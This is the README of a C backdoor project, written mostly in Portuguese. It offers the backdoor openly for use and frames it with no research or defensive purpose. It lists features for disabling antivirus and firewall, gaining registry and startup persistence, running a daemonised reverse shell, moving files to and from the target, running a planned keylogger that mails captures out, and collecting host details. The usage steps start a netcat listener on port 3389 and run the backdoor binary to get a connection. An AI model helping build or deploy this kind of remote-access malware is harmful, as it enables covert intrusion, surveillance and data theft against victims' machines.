# Silent_door.c

# Clássico backdoor, escrito na linguagem C.
 
# Em desenvolvimento.

Desenvolpment of a backdoor write in C. 

# Funções: 

# auto executáveis > executam junto com o programa principal.

(#) desativar anti-vírus 

(#) desativar firewall 

(#) copiar o software para o registro da máquina alvo 

(#) copiar software para inicialização junto aos demais programas 


# Funções arbitrárias:

# executadas pelo servidor 

(#) fork para criar um deamon > usado em combinação com a reverse shell 

(#) enviar arquivo para a máquina alvo

(#) fazer download de arquivos da máquina

( ) inicializar keylogger em modo passivo, enviando os arquivos para e-mail e/ou direto para o servidor. 

(#) informações sobre: ip, nome da máquina

( ) informações sobre: a rede da máquina alvo ( outras máquinas conectadas à mesma rede)
 
.... mais por vir. 


# ./sdinstall.sh | script to install and compile the source. 

# Usage: 

1. nc -lvp 3389 

2. run ./main_backdoor (or ./wine.01.2) 

3. you have connection. 

# can be very usefull. 4. python -m SimpleHTTPServer 3389 

5. In this pont, just use your skills. 

Peace, 

mrx6SO
